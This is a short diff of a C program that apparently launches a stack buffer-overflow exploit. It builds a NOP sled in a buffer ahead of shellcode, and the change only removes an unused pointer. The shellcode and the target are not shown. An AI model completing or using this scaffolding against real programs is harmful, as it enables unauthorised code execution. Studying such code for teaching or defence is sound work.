@@ -13,7 +13,6 @@ main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	unsigned long *add_ptr;
 	char *buff, *ptr;
 	int bsize=DEFAULT_BUFFER_SIZE;
 	int i;
@@ -26,8 +25,7 @@ main ( int argc, char * argv[] )
 	}
 	
 
-	ptr = buff;
-	add_ptr = (unsigned long*) buff;
+
 	for (i=0; i<bsize-strlen(shellcode) - 4; i++){
 		buff[i] = NOP;
 	}
